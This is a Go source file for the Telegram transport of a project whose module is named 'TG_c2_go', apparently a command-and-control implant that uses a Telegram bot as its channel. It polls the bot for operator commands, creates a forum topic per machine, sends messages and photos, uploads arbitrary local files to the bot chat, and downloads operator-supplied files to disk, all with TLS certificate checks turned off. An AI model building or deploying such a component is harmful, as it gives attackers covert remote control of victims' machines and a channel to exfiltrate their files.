package telegram

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"TG_c2_go/config"
)

// TelegramClient 封装Telegram Bot API客户端
type TelegramClient struct {
	client *http.Client
}

// NewTelegramClient 创建新的Telegram客户端
func NewTelegramClient() *TelegramClient {
	// 创建HTTP客户端，支持自定义证书
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // 在生产环境中应该设置为false并添加自定义证书
		},
	}

	return &TelegramClient{
		client: &http.Client{
			Transport: tr,
			Timeout:   30 * time.Second,
		},
	}
}

// GetHTTPClient 获取HTTP客户端实例
func (tc *TelegramClient) GetHTTPClient() *http.Client {
	return tc.client
}

// GetUpdates 获取Telegram更新
func (tc *TelegramClient) GetUpdates(offset int64) ([]byte, error) {
	url := config.GetUpdateURL()
	if url == "" {
		return nil, fmt.Errorf("未配置 BOT_TOKEN 或 UPDATE_URL")
	}
	if offset > 0 {
		url += "?offset=" + strconv.FormatInt(offset, 10)
	}

	resp, err := tc.client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("获取更新失败: %v", err)
	}
	defer resp.Body.Close()

	// 检查HTTP响应状态码
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("获取更新失败: HTTP状态码 %d, 响应: %s", resp.StatusCode, string(body))
	}

	return io.ReadAll(resp.Body)
}

// SendMessage 发送文本消息
func (tc *TelegramClient) SendMessage(text string) error {
	url := config.GetSendMessageURL()
	if url == "" {
		return fmt.Errorf("未配置 BOT_TOKEN 或 SENDMSG_URL")
	}

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	writer.WriteField("chat_id", config.CHAT_ID)
	writer.WriteField("message_thread_id", strconv.FormatInt(config.GetMessageThreadID(), 10))
	writer.WriteField("text", text)

	writer.Close()

	req, err := http.NewRequest("POST", url, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := tc.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("发送消息失败: %d", resp.StatusCode)
	}

	return nil
}

// SendPhoto 发送照片
func (tc *TelegramClient) SendPhoto(photoPath string) error {
	url := config.GetSendPhotoURL()
	if url == "" {
		return fmt.Errorf("未配置 BOT_TOKEN 或 SEND_PHOTO_URL")
	}

	file, err := os.Open(photoPath)
	if err != nil {
		return err
	}
	defer file.Close()

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	writer.WriteField("chat_id", config.CHAT_ID)
	writer.WriteField("message_thread_id", strconv.FormatInt(config.GetMessageThreadID(), 10))

	part, err := writer.CreateFormFile("photo", filepath.Base(photoPath))
	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := tc.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

// UploadFile 上传文件
func (tc *TelegramClient) UploadFile(filePath string) error {
	url := config.GetUploadFileURL()
	if url == "" {
		return fmt.Errorf("未配置 BOT_TOKEN 或 UPLOAD_FILE_URL")
	}

	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("无法打开文件 %s: %v", filePath, err)
	}
	defer file.Close()

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	writer.WriteField("chat_id", config.CHAT_ID)
	writer.WriteField("message_thread_id", strconv.FormatInt(config.GetMessageThreadID(), 10))

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := tc.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("文件上传失败: %d", resp.StatusCode)
	}

	fmt.Printf("文件上传成功: %s\\n", filePath)
	return nil
}

// CreateForumTopic 创建论坛主题
func (tc *TelegramClient) CreateForumTopic(name string) (int64, error) {
	url := config.GetCreateForumTopicURL()
	if url == "" {
		return 0, fmt.Errorf("未配置 BOT_TOKEN 或 CREATEFORUMTOPIC_URL")
	}

	payload := map[string]interface{}{
		"chat_id": config.CHAT_ID,
		"name":    name,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return 0, fmt.Errorf("序列化请求数据失败: %v", err)
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonPayload))
	if err != nil {
		return 0, fmt.Errorf("创建HTTP请求失败: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := tc.client.Do(req)
	if err != nil {
		return 0, fmt.Errorf("发送HTTP请求失败: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, fmt.Errorf("读取响应失败: %v", err)
	}

	if resp.StatusCode != http.StatusOK {
		return 0, fmt.Errorf("创建主题失败: HTTP状态码 %d, 响应: %s", resp.StatusCode, string(body))
	}

	var result struct {
		OK     bool `json:"ok"`
		Result struct {
			MessageThreadID int64 `json:"message_thread_id"`
		} `json:"result"`
		Description string `json:"description"`
	}

	err = json.Unmarshal(body, &result)
	if err != nil {
		return 0, fmt.Errorf("解析响应JSON失败: %v, 原始响应: %s", err, string(body))
	}

	if !result.OK {
		return 0, fmt.Errorf("创建主题失败: %s", result.Description)
	}

	if result.Result.MessageThreadID == 0 {
		return 0, fmt.Errorf("创建主题失败: 返回的thread_id为0, 响应: %s", string(body))
	}

	return result.Result.MessageThreadID, nil
}

// GetFileDownloadURL 获取文件下载URL
func (tc *TelegramClient) GetFileDownloadURL(fileID string) (string, string, error) {
	url := config.GetFilePathURL()
	if url == "" {
		return "", "", fmt.Errorf("未配置 BOT_TOKEN 或 GET_FILE_PATH_URL")
	}
	url += "?file_id=" + fileID

	resp, err := tc.client.Get(url)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}

	var result struct {
		Result struct {
			FilePath string `json:"file_path"`
		} `json:"result"`
	}

	err = json.Unmarshal(body, &result)
	if err != nil {
		return "", "", err
	}

	downloadBaseURL := config.GetDownloadFileBaseURL()
	if downloadBaseURL == "" {
		return "", "", fmt.Errorf("未配置 BOT_TOKEN 或 DOWNLOAD_FILE_URL")
	}
	downloadURL := downloadBaseURL + "/" + result.Result.FilePath
	return downloadURL, result.Result.FilePath, nil
}

// DownloadFile 下载文件
func (tc *TelegramClient) DownloadFile(url, savePath string) error {
	resp, err := tc.client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// 确保目录存在
	dir := filepath.Dir(savePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	file, err := os.Create(savePath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	return err
}
